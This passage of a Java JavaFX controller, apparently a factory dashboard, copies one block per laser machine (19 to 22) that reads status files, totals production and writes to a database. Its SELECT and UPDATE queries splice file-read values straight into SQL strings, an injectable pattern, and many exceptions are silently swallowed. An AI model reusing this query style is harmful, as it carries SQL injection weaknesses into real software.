//      String poth19 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth19=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg19=new File (poth+"\\Machine19.kady");
        if (lkg19.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg19));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno118.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod118.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit118.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod118.setText(v5);
           unit118.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine19.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
           areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine19.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine19.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine19.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine19.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe19.txt"));
             summe19=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine19.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog118.setText(Integer.toString(sum-summe19));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  


//nog118.setText("N/A");
//nog118.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane19.setStyle("-fx-background-color:orange;");
              eff118.setText("0%");
          }
          
          else {
              
                vboxpane19.setStyle("-fx-background-color:transparent;");
              
              long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff118.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff118.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff118.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff118.setText("N/A");
          }
          
          }
          
          
        
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg19.delete();
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 19 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno118.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno118.setText("Machine   "+machine_number19);
        nog118.setText("0");
        eff118.setText("0%");
        mod118.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod118.setText("Machine isn't working");
        unit118.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit118.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh118.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    refresh119.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 20 ////////////////////////////
      String machine_number20="20";  
//      String poth20 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth20=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg20=new File (poth+"\\Machine20.kady");
        if (lkg20.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg20));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno119.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod119.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit119.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod119.setText(v5);
           unit119.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine20.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
           areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine20.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine20.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine20.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine20.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe20.txt"));
             summe20=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine20.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog119.setText(Integer.toString(sum-summe20));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }

//nog119.setText("N/A");
//nog119.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane20.setStyle("-fx-background-color:orange;");
              eff119.setText("0%");
          }
          
          else {
              
                vboxpane20.setStyle("-fx-background-color:transparent;");
              
               
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff119.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff119.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff119.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff119.setText("N/A");
          }
          }
          
          
       
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg20.delete();
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 20 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno119.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno119.setText("Machine   "+machine_number20);
        nog119.setText("0");
        eff119.setText("0%");
        mod119.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod119.setText("Machine isn't working");
        unit119.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit119.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
        
       
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
         
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
   refresh119.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    refresh120.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 21 ////////////////////////////
      String machine_number21="21";  
//      String poth20 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth20=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg21=new File (poth+"\\Machine21.kady");
        if (lkg21.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg21));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno120.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod120.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit120.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod120.setText(v5);
           unit120.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine21.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
           areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine21.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine21.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine21.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine21.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe21.txt"));
             summe21=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine21.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog120.setText(Integer.toString(sum-summe21));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }

//nog119.setText("N/A");
//nog119.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane21.setStyle("-fx-background-color:orange;");
              eff120.setText("0%");
          }
          
          else {
              
                vboxpane21.setStyle("-fx-background-color:transparent;");
              
               
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff120.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff120.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff120.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff120.setText("N/A");
          }
          }
          
          
       
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg21.delete();
            
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 21 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno120.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno120.setText("Machine   "+machine_number21);
        nog120.setText("0");
        eff120.setText("0%");
        mod120.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod120.setText("Machine isn't working");
        unit120.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit120.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
        
      
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    
    
    
    
    
    
        
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh120.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    refresh121.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 22 ////////////////////////////
      String machine_number22="22";  
//      String poth20 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth20=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg22=new File (poth+"\\Machine22.kady");
        if (lkg22.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg22));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno121.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod121.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit121.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod121.setText(v5);
           unit121.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine22.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
           areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine22.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine22.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine22.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine22.txt"));
